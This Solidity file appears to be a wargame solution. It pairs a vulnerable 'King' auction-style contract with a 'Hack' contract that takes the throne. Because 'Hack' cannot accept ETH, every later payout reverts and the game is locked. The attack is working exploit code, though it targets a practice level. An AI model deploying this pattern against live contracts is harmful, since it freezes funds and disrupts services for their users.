// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Become king by sending more ETH than prize

contract Hack {
  constructor(address payable  target) {
    uint prize =King(target).prize();
    (bool ok, ) = target.call{value: prize}("");
    require(ok, "call fail");
  }
}

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}


//0xA4332b7b6B62D1D5FD388B6D6CEcAC15360D655B
